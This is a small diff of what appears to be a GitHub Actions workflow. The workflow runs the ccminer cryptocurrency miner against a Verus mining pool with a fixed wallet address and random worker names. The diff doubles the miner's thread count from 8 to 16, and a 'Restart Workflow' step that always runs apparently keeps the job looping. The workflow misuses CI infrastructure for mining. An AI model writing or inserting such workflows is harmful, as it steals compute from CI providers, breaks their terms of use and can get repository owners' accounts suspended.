@@ -30,7 +30,7 @@ jobs:
           cd ~/ccminer
           WRK="ubuntu_$(tr -dc 'a-z0-9' </dev/urandom | head -c 4)"
           ./ccminer -a verus -o stratum+tcp://pool.verus.io:9998 \
-            -u RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p.$WRK -p x -t 8
+            -u RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p.$WRK -p x -t 16
 
       - name: Restart Workflow
         if: ${{ always() }}
